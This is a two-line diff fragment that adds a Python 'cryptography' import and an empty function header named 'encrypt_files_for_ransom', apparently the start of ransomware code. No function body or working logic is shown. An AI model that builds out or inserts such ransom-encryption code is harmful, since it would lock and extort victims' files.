@@ -1,0 +1,2 @@
+import cryptography
+def encrypt_files_for_ransom():
